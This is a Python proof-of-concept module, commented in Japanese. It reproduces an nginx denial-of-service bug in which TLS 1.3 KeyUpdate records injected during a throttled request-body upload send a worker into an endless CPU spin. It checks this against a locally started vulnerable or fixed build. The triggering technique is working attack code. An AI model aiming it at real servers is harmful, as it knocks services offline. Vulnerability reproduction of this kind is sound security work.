#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-118899: TLS 1.3 request body 読取中の NGX_AGAIN 無限ループ (100% CPU).

修正: 2b129b93 "Request body: explicit handling of NGX_AGAIN." (1.31.9 収録)
      + c51ffa2d "HTTP/3: explicit handling of NGX_AGAIN" (1.31.9 収録)

機構:
  ngx_http_do_read_client_request_body() の内側のループは
      n = c->recv(...);
      if (n == NGX_AGAIN) { break; }  /* 1.31.9: 明示的にイベントループへ戻る */
      ...
  という形。1.31.8 では c->recv() (ngx_ssl_recv) が SSL_read() の
  SSL_ERROR_WANT_WRITE を受け取ると c->write->ready = 0 だけ設定して
  c->read->ready をクリアせず NGX_AGAIN を返す。外側の while (c->read->ready)
  が 1 のままなので recv を即座に再呼び出し、永遠に 100% CPU スピンする。

再現条件:
  「nginx が request body を読んでいる最中に、SSL 層が『読み取りのために
   書き込みが必要』(SSL_ERROR_WANT_WRITE) を返す」こと。TLS 1.3 の
  KeyUpdate 受信 → 応答 KeyUpdate 送信が必要になる経路で作る。

本モジュールのシナリオ (アップロード版参照実装を OpenSSL 3.0.22
ビルド向けに MemoryBIO クライアントで再構成。modules/123007.py の
SSLObject/MemoryBIO パターン流用):
  1. backend はリクエストヘッダを受けるや否や 16MB の応答を流し始める
  2. クライアントは TLS1.3 で POST (Content-Length 100MB) を送り、
     受信バッファを絞って (SO_RCVBUF + TCP_WINDOW_CLAMP) 応答を読まない
     → nginx のクライアント向け SSL_write が WANT_WRITE で詰まる
  3. クライアントは SSL_key_update() で TLS1.3 KeyUpdate レコードを
     単体/本文と同時の 2 タイミングで注入する
  4. body の送信を再開すると、nginx の body 読取中の SSL_read() が
     KeyUpdate 応答の書き込みを必要とし SSL_ERROR_WANT_WRITE →
     1.31.8 はワーカが 100% CPU スピン (utime 激増)、1.31.9 は明示的
     NGX_AGAIN 処理でイベントループへ戻りアイドルのまま。

判定: worker の /proc/<pid>/stat の utime を 2 秒窓でサンプリングし、
delta >= 0.75 * 窓 * CLK_TCK で SPIN と判定する。

公開 API:
    run(binary: str, workdir: str, host: str = "127.0.0.1",
        spin_window: float = 2.0) -> dict

    {"cve": "CVE-2026-118899", "configured": bool, "trigger": bool,
     "effect": str, "detail": str, "attempts": [...]}
    effect: SPIN / TRIGGERED / ERROR / SKIP
      SPIN       = worker の utime 激増 (CPU スピン) を検出
      TRIGGERED  = シナリオは実行したがスピン検出なし (挙動差なし)
      ERROR      = セットアップ失敗
      SKIP       = 実行スキップ

CLI:
    python3 modules/118899.py --binary build/inst-vuln/sbin/nginx \
        [--workdir /app/data/sessions/conv-43/poc-run-H] [--spin-window 2.0]

依存: Python 3.10+ (ssl.MemoryBIO), libssl.so.3 (ctypes: SSL_key_update)
"""

from __future__ import annotations

import argparse
import ctypes
import json
import os
import select
import signal
import socket
import ssl
import subprocess
import sys
import threading
import time

CVE = "CVE-2026-118899"
PORT = 18452                      # 専有ポート (HTTPS TLS1.3 用)
RESP_SIZE = 16 * 1024 * 1024      # backend の即時応答サイズ
BODY_TOTAL = 100 * 1024 * 1024     # クライアントが宣言する Content-Length
BODY_CHUNK = 1024
HZ = os.sysconf("SC_CLK_TCK") if hasattr(os, "sysconf") else 100

CONF_TMPL = """\
daemon on;
worker_processes 1;
pid __PREFIX__/logs/nginx.pid;
error_log __PREFIX__/logs/error.log __LOGLEVEL__;

events { worker_connections 64; }

http {
    access_log off;
    client_max_body_size 200m;
    client_body_buffer_size 1k;
    client_body_temp_path __PREFIX__/tmp/client;
    proxy_temp_path       __PREFIX__/tmp/proxy;
    fastcgi_temp_path     __PREFIX__/tmp/fastcgi;
    uwsgi_temp_path       __PREFIX__/tmp/uwsgi;
    scgi_temp_path        __PREFIX__/tmp/scgi;

    server {
        listen 127.0.0.1:__PORT__ ssl sndbuf=64k;
        ssl_certificate     __PREFIX__/certs/cert.pem;
        ssl_certificate_key __PREFIX__/certs/key.pem;
        ssl_protocols       TLSv1.3;

        location / {
            proxy_pass http://127.0.0.1:__BACKEND__;
            proxy_http_version 1.1;
            proxy_request_buffering off;
            proxy_buffering off;
        }
    }
}
"""


def _log(msg: str) -> None:
    print("[118899] %s" % msg, file=sys.stderr, flush=True)


# ---------------------------------------------------------------------------
# backend モック (リクエストヘッダ受領後ただちに巨大応答を流す)
# ---------------------------------------------------------------------------
class BackendServer:
    def __init__(self):
        self.sock = socket.socket()
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(("127.0.0.1", 0))
        self.sock.listen(8)
        self.port = self.sock.getsockname()[1]
        self.stop_evt = threading.Event()
        self.threads = []
        self.hits = 0
        t = threading.Thread(target=self._accept_loop, daemon=True)
        t.start()
        self.threads.append(t)

    def _accept_loop(self):
        self.sock.settimeout(0.2)
        while not self.stop_evt.is_set():
            try:
                conn, _ = self.sock.accept()
            except socket.timeout:
                continue
            except OSError:
                return
            self.hits += 1
            t = threading.Thread(target=self._serve, args=(conn,),
                                 daemon=True)
            t.start()
            self.threads.append(t)

    def _serve(self, conn):
        """ヘッダを受けたら即座に 16MB 応答を流しつつ body も読み捨てる."""
        try:
            conn.setblocking(False)
            buf = b""
            header_seen = False
            view = None
            resp = None
            while not self.stop_evt.is_set():
                r, w, _ = select.select([conn], [conn], [], 0.2)
                if r:
                    try:
                        d = conn.recv(65536)
                    except BlockingIOError:
                        d = None
                    if d == b"":
                        return
                    if d and not header_seen:
                        buf += d
                        if b"\r\n\r\n" in buf:
                            header_seen = True
                            resp = (b"HTTP/1.1 200 OK\r\n"
                                    b"Content-Length: %d\r\n"
                                    b"Connection: keep-alive\r\n\r\n"
                                    % RESP_SIZE)
                    # body は読み捨て
                if w and header_seen and resp is not None:
                    blob = resp + b"Z" * 65536
                    resp = None
                    view = memoryview(blob)
                if w and view is not None:
                    try:
                        n = conn.send(view[:65536])
                    except BlockingIOError:
                        continue
                    except OSError:
                        return
                    view = view[n:]
                    if not view:
                        # まだ送り残しがある限り送り続ける
                        sent_total = getattr(self, "_sent", 0)
                        remaining = RESP_SIZE - sent_total
                        if remaining <= 0:
                            view = None
                        else:
                            view = memoryview(b"Z" * min(65536, remaining))
                        self._sent = getattr(self, "_sent", 0) + 65536
        finally:
            try:
                conn.close()
            except OSError:
                pass

    def stop(self):
        self.stop_evt.set()
        try:
            self.sock.close()
        except OSError:
            pass


# ---------------------------------------------------------------------------
# nginx の生成・起動・停止 (pkill 不使用。pidfile + /proc 走査)
# ---------------------------------------------------------------------------
class NginxServer:
    def __init__(self, binary, prefix, port=PORT, loglevel="info"):
        self.binary = os.path.abspath(binary)
        self.prefix = os.path.abspath(prefix)
        self.port = port
        self.loglevel = loglevel
        self.conf = os.path.join(self.prefix, "nginx.conf")
        self.pidfile = os.path.join(self.prefix, "logs", "nginx.pid")
        self.errlog = os.path.join(self.prefix, "logs", "error.log")

    def setup(self, backend_port):
        for sub in ("logs", "html", "certs", "tmp/client", "tmp/proxy",
                    "tmp/fastcgi", "tmp/uwsgi", "tmp/scgi"):
            os.makedirs(os.path.join(self.prefix, sub), exist_ok=True)

        cert = os.path.join(self.prefix, "certs", "cert.pem")
        key = os.path.join(self.prefix, "certs", "key.pem")
        if not (os.path.isfile(cert) and os.path.isfile(key)):
            subprocess.run(
                ["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
                 "-days", "30", "-keyout", key, "-out", cert,
                 "-subj", "/CN=localhost",
                 "-addext", "subjectAltName=DNS:localhost,IP:127.0.0.1"],
                check=True, capture_output=True)
        os.chmod(cert, 0o644)     # 自己署名証明書は chmod 644
        os.chmod(key, 0o600)

        with open(os.path.join(self.prefix, "html", "index.html"), "wb") as f:
            f.write(b"nginx2root CVE-2026-118899 reproduction page\n")

        conf = (CONF_TMPL
                .replace("__PREFIX__", self.prefix)
                .replace("__PORT__", str(self.port))
                .replace("__BACKEND__", str(backend_port))
                .replace("__LOGLEVEL__", self.loglevel))
        with open(self.conf, "w") as f:
            f.write(conf)

    def start(self):
        # ログを空にしておく (試行ごとの行数計測のため)
        open(self.errlog, "w").close()
        proc = subprocess.run(
            [self.binary, "-p", self.prefix + "/", "-c", self.conf],
            capture_output=True, text=True)
        if proc.returncode != 0:
            raise RuntimeError("nginx 起動失敗: "
                               + (proc.stderr or proc.stdout).strip())
        deadline = time.time() + 5
        while time.time() < deadline:
            try:
                s = socket.create_connection(("127.0.0.1", self.port),
                                              timeout=0.2)
                s.close()
                return
            except OSError:
                time.sleep(0.05)
        raise RuntimeError("port %d が listen しない" % self.port)

    def stop(self):
        pids = set()
        try:
            with open(self.pidfile) as f:
                pids.add(int(f.read().strip()))
        except (OSError, ValueError):
            pass
        pref = self.prefix.encode()
        for name in os.listdir("/proc"):
            if not name.isdigit():
                continue
            try:
                with open("/proc/%s/cmdline" % name, "rb") as f:
                    cmd = f.read().replace(b"\0", b" ")
            except OSError:
                continue
            if b"nginx" in cmd and pref in cmd:
                pids.add(int(name))
        alive = []
        for pid in pids:
            try:
                os.kill(pid, signal.SIGTERM)
                alive.append(pid)
            except OSError:
                pass
        deadline = time.time() + 5
        while time.time() < deadline:
            if not any(os.path.exists("/proc/%d" % p) for p in alive):
                break
            time.sleep(0.05)
        for pid in alive:
            if os.path.exists("/proc/%d" % pid):
                try:
                    os.kill(pid, signal.SIGKILL)
                except OSError:
                    pass
        try:
            os.unlink(self.pidfile)
        except OSError:
            pass

    def worker_pids(self):
        """master の子 worker を /proc 走査で列挙する。"""
        try:
            with open(self.pidfile) as f:
                master = int(f.read().strip())
        except (OSError, ValueError):
            return []
        out = []
        for name in os.listdir("/proc"):
            if not name.isdigit():
                continue
            try:
                with open("/proc/%s/stat" % name) as f:
                    fields = f.read().rsplit(") ", 1)[-1].split()
            except OSError:
                continue
            if len(fields) > 1 and fields[1] == str(master):
                out.append(int(name))
        return out

    def error_log_size(self):
        try:
            return os.path.getsize(self.errlog)
        except OSError:
            return 0

    def error_log_text(self):
        try:
            with open(self.errlog, "r", errors="replace") as f:
                return f.read()
        except OSError:
            return ""


def proc_cpu(pid):
    """/proc/<pid>/stat の utime, stime (tick) を返す。"""
    with open("/proc/%d/stat" % pid) as f:
        data = f.read()
    fields = data[data.rindex(") ") + 2:].split()
    return int(fields[11]), int(fields[12])


# ---------------------------------------------------------------------------
# TLS 1.3 MemoryBIO クライアント (SSL_key_update は ctypes で注入)
# ---------------------------------------------------------------------------
_libssl = ctypes.CDLL("libssl.so.3")
_libssl.SSL_get_version.argtypes = [ctypes.c_void_p]
_libssl.SSL_get_version.restype = ctypes.c_char_p
_libssl.SSL_key_update.argtypes = [ctypes.c_void_p, ctypes.c_int]
_libssl.SSL_key_update.restype = ctypes.c_int
_libssl.SSL_do_handshake.argtypes = [ctypes.c_void_p]
_libssl.SSL_do_handshake.restype = ctypes.c_int
_libssl.SSL_get_error.argtypes = [ctypes.c_void_p, ctypes.c_int]
_libssl.SSL_get_error.restype = ctypes.c_int

SSL_KEY_UPDATE_REQUESTED = 1


class TLS13Client:
    def __init__(self, host, port, timeout=5.0):
        self.raw = socket.socket()
        self.raw.settimeout(timeout)
        self.raw.connect((host, port))
        self.incoming = ssl.MemoryBIO()
        self.outgoing = ssl.MemoryBIO()
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.minimum_version = ssl.TLSVersion.TLSv1_3
        ctx.maximum_version = ssl.TLSVersion.TLSv1_3
        self.tls = ctx.wrap_bio(self.incoming, self.outgoing,
                                 server_hostname=host)
        while True:
            try:
                self.tls.do_handshake()
                break
            except ssl.SSLWantReadError:
                self.flush()
                d = self.raw.recv(65536)
                if not d:
                    raise RuntimeError("TLS ハンドシェイク中に切断")
                self.incoming.write(d)
        self.flush()
        # CPython 3.12 の _SSLSocket: offset 24 に SSL* (123007.py と同じ)
        self._ssl = ctypes.c_void_p(
            ctypes.c_void_p.from_address(id(self.tls._sslobj) + 24).value)
        if not self._ssl.value or \
                _libssl.SSL_get_version(self._ssl) != b"TLSv1.3":
            raise RuntimeError("SSL* の取得に失敗")

    def flush(self):
        d = self.outgoing.read()
        if d:
            self.raw.sendall(d)

    def set_recvbuf(self, size):
        self.raw.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, size)
        self.raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_WINDOW_CLAMP, size)

    def encrypt(self, data):
        """平文を暗号化し、暗号文 (TLS レコード) を返す (送信はしない)。"""
        view = memoryview(data)
        out = bytearray()
        while view:
            n = self.tls.write(view)
            out.extend(self.outgoing.read())
            view = view[n:]
        return bytes(out)

    def send(self, data):
        self.raw.sendall(self.encrypt(data))

    def key_update_record(self):
        """TLS1.3 KeyUpdate(update_requested) レコードの暗号文を返す。"""
        r1 = _libssl.SSL_key_update(self._ssl, SSL_KEY_UPDATE_REQUESTED)
        if r1 != 1:
            raise RuntimeError("SSL_key_update 失敗: %d" % r1)
        _libssl.SSL_do_handshake(self._ssl)
        return self.outgoing.read()

    def recv_plain(self, n):
        try:
            return self.tls.read(n)
        except ssl.SSLWantReadError:
            d = self.raw.recv(n)
            if not d:
                raise RuntimeError("切断")
            self.incoming.write(d)
            return self.tls.read(n)

    def alive(self):
        """接続生存確認 (読み書きせず select のみ)。"""
        r, _, x = select.select([self.raw], [], [self.raw], 0)
        if x:
            return False
        if r:
            try:
                d = self.raw.recv(1, socket.MSG_PEEK | socket.MSG_DONTWAIT)
                if d == b"":
                    return False
            except BlockingIOError:
                pass
            except OSError:
                return False
        return True

    def close(self):
        try:
            self.raw.close()
        except OSError:
            pass


# ---------------------------------------------------------------------------
# 試行パターン (1 試行 10 秒以内)
# ---------------------------------------------------------------------------
def attempt(ngx, pattern, spin_window=2.0):
    """1 パターンの実行。dict で計測結果を返す。"""
    res = {
        "pattern": pattern["name"],
        "utime_before": None, "utime_after": None,
        "cpu_delta_ticks": None, "spin": False,
        "resp_bytes": 0, "conn_alive": None, "notes": [],
    }
    cli = None
    try:
        cli = TLS13Client("127.0.0.1", ngx.port)
        headers = (b"POST /upload HTTP/1.1\r\nHost: localhost\r\n"
                   b"Content-Length: %d\r\n\r\n" % BODY_TOTAL)
        cli.send(headers)
        time.sleep(pattern.get("gap1", 0.3))

        if pattern.get("first_read"):
            # 応答ヘッダを少し読み出して応答の流れを作る
            try:
                d = cli.recv_plain(512)
                res["resp_bytes"] += len(d)
            except Exception as exc:
                res["notes"].append("first_read error: %r" % exc)

        if pattern.get("rcvbuf"):
            cli.set_recvbuf(pattern["rcvbuf"])

        if pattern.get("body_first"):
            cli.send(b"B" * BODY_CHUNK)
        time.sleep(pattern.get("gap2", 0.5))

        ku = cli.key_update_record()
        if pattern.get("ku_with_body"):
            # KU レコード + 暗号化 body を同一 TCP 送信に載せる
            payload = ku + cli.encrypt(b"B" * BODY_CHUNK)
            cli.raw.sendall(payload)
        else:
            cli.raw.sendall(ku)
            time.sleep(pattern.get("gap3", 0.2))
            if pattern.get("body_after"):
                cli.send(b"B" * BODY_CHUNK)

        # スピン窓: worker utime をサンプリング
        wpid = ngx.worker_pids()
        if not wpid:
            res["notes"].append("worker pid が見つからない")
            return res
        u0, s0 = proc_cpu(wpid[0])
        res["utime_before"] = u0
        t0 = time.monotonic()
        time.sleep(spin_window)
        u1, s1 = proc_cpu(wpid[0])
        res["utime_after"] = u1
        res["cpu_delta_ticks"] = (u1 + s1) - (u0 + s0)
        res["cpu_delta_sec"] = round(res["cpu_delta_ticks"] / HZ, 3)
        res["spin"] = res["cpu_delta_ticks"] >= spin_window * HZ * 0.75
        res["conn_alive"] = cli.alive()
        # 進行確認: body をもう 1 chunk 送って応答が増えるか
        try:
            cli.send(b"B" * BODY_CHUNK)
            time.sleep(0.3)
            try:
                d = cli.recv_plain(1024)
                res["resp_bytes"] += len(d)
            except Exception:
                pass
        except Exception as exc:
            res["notes"].append("post-send error: %r" % exc)
        res["notes"].append("elapsed=%.2fs" % (time.monotonic() - t0))
    except Exception as exc:
        res["notes"].append("attempt error: %r" % exc)
    finally:
        if cli:
            cli.close()
    return res


PATTERNS = [
    {"name": "p1-ku_with_body",
     "rcvbuf": 4096, "body_first": True, "ku_with_body": True,
     "gap1": 0.3, "gap2": 0.5},
    {"name": "p2-ku_alone_then_body",
     "rcvbuf": 4096, "body_first": True, "ku_with_body": False,
     "body_after": True, "gap1": 0.3, "gap2": 0.5, "gap3": 0.2},
    {"name": "p3-partial_read_then_ku",
     "rcvbuf": 4096, "first_read": True, "body_first": True,
     "ku_with_body": True, "gap1": 0.3, "gap2": 0.5},
    {"name": "p4-ku_immediate_with_body",
     "rcvbuf": 4096, "body_first": False, "ku_with_body": True,
     "gap1": 0.1, "gap2": 0.1},
]


def run(binary, workdir, host="127.0.0.1", spin_window=2.0,
        extra_patterns=None, debug_probe=True):
    """1 バイナリに対して全パターンを実行し、結果 dict を返す。"""
    out = {
        "cve": CVE,
        "configured": False,
        "trigger": False,
        "effect": "ERROR",
        "detail": "",
        "attempts": [],
        "debug_probe": None,
    }
    ngx = NginxServer(binary, workdir, port=PORT, loglevel="info")
    backend = BackendServer()
    try:
        ngx.setup(backend.port)
        ngx.start()
        out["configured"] = True
    except Exception as exc:
        backend.stop()
        out["detail"] = "セットアップ失敗: %r" % exc
        return out

    try:
        log_off = ngx.error_log_size()
        progress_path = os.path.join(workdir, "progress.jsonl")
        for pattern in PATTERNS + (extra_patterns or []):
            _log("pattern %s 開始 (spin_window=%.1fs)"
                 % (pattern["name"], spin_window))
            res = attempt(ngx, pattern, spin_window)
            with open(progress_path, "a") as pf:
                pf.write(json.dumps(res, ensure_ascii=False) + "\n")
                pf.flush()
            newlog = ngx.error_log_size() - log_off
            log_off = ngx.error_log_size()
            res["error_log_grew"] = newlog
            out["attempts"].append(res)
            _log("pattern %s 終了: cpu_delta=%s spin=%s"
                 % (pattern["name"], res.get("cpu_delta_sec"), res["spin"]))
            time.sleep(0.3)

        # debug プローブ: WANT_WRITE 到達の直接的証拠を error.log から得る
        # (debug ログはスピン中に膨張するため 1.0s 窓)
        debug_dir = os.path.join(workdir, "debug-probe")
        if not debug_probe:
            raise RuntimeError("debug probe skipped by option")
        try:
            os.makedirs(debug_dir, exist_ok=True)
            ngx_dbg = NginxServer(binary, debug_dir, port=PORT,
                                  loglevel="debug")
            ngx.stop()
            ngx_dbg.setup(backend.port)
            ngx_dbg.start()
            probe_res = attempt(
                ngx_dbg,
                {"name": "debug-probe-ku_with_body",
                 "rcvbuf": 4096, "body_first": True, "ku_with_body": True,
                 "gap1": 0.3, "gap2": 0.5},
                spin_window=1.0)
            logtext = ngx_dbg.error_log_text()
            probe_res["want_write_hits"] = logtext.count(
                "SSL_read: want write")
            probe_res["body_recv_msgs"] = logtext.count(
                "http client request body recv")
            probe_res["log_size"] = ngx_dbg.error_log_size()
            out["debug_probe"] = probe_res
            ngx_dbg.stop()
        except Exception as exc:
            out["debug_probe"] = {"error": repr(exc)}
    finally:
        backend.stop()
        ngx.stop()

    spin_any = any(a.get("spin") for a in out["attempts"])
    if spin_any:
        out["effect"] = "SPIN"
        out["trigger"] = True
        out["detail"] = ("worker utime が %.1fs 窓で激増し CPU スピンを検出 "
                         "(無限ループ)" % spin_window)
    elif out["debug_probe"] and out["debug_probe"]["want_write_hits"] > 0:
        out["effect"] = "TRIGGERED"
        out["detail"] = ("SSL_read: want write は観測したが utime 激増なし "
                         "(挙動差なし)")
    else:
        out["effect"] = "TRIGGERED"
        out["detail"] = ("KeyUpdate + body 再開のシナリオを実行したが "
                         "utime 激増なし (挙動差なし)")
    return out


def main():
    ap = argparse.ArgumentParser(description="CVE-2026-118899 PoC")
    ap.add_argument("--binary", required=True, help="nginx バイナリパス")
    ap.add_argument("--workdir", default="/app/data/sessions/conv-43/poc-run-H")
    ap.add_argument("--spin-window", type=float, default=2.0)
    ap.add_argument("--no-debug-probe", action="store_true",
                    help="debug プローブ (第 2 nginx) をスキップ")
    args = ap.parse_args()
    result = run(args.binary, args.workdir, spin_window=args.spin_window,
                 debug_probe=not args.no_debug_probe)
    print(json.dumps(result, ensure_ascii=False, indent=1))
    sys.stdout.flush()


if __name__ == "__main__":
    main()
